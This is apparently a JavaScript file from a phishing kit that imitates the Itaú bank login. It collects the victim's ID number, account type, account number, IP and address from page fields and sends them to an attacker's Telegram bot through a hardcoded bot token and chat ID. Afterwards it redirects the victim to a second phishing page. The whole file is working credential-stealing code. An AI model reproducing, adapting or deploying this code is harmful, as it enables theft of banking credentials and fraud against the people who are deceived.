//bot token
var telegram_bot_id = "7637623383:AAHwHKx6r6m84Dz-vmWE5vmykfM66k5ReEc";
//chat id
var chat_id = 7718968414;
var u_name, u_name2, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("segmento").value;
    u_name2 = document.getElementById("cedula").value;
    pax = document.getElementById("tipoCuenta").value;
    pax2 = document.getElementById("cuenta").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🧡ITAU🧡\nB4NCA: " + u_name + "\nDOC: " + u_name2 + "\nTIPO: " + pax +"\nNUM: " + pax2 +"\nIP: " + ip +"\n" + ip2 +"\n🧡BY GBL🧡";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index2.html';
        console.log(response);
    });
    return false;
};
